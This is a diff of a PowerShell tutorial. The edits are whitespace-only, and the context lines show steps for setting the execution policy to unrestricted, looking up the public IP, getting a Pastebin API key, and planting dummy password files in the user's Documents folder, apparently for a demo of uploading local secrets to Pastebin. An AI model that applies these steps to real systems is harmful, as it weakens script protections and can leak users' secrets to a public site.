@@ -9,7 +9,7 @@ Go to the folder where you previously created logindata.ps1 and create a new fil
 
 You might have to launch powershell as administrator first to change the set-executionpolicy to "unrestricted"
 
-```Powershell
+```
 set-executionpolicy unrestricted
 ```
 
@@ -17,6 +17,7 @@ set-executionpolicy unrestricted
 2. Visit this URL
 
 ```Powershell
+
 #Demo 1, Something easy. Userkey won't be used yet so everything is anonymous
 . .\logindata.ps1
 $Content    =   Invoke-WebRequest -Uri "https://ipinfo.io/json"
@@ -53,6 +54,7 @@ This means we will use 2 keys​:
 
 Create a new file called `get-apiuserkey.ps1`, using the code below.
 ```Powershell
+
 $DevKey     = "PUT-DEV-KEY-HERE"
 $Username   = "PUT-PASTEBIN-USERNAME-HERE"
 $Password   = "PUT-PASTEBIN-PASSWORD-HERE"
@@ -78,8 +80,10 @@ For demo purposes we're going to create 2 dummy files: `password.txt` and `secre
 
 password.txt has the following contents
 ```Powershell
+
 PUT THIS FILE IN C:\Users\$env:username\Documents
-I do silly things like sometimes putting passwords in files. 
+I do silly things like sometimes putting passwords in files.
+
 ```
 secret.txt has the following contents
 ```
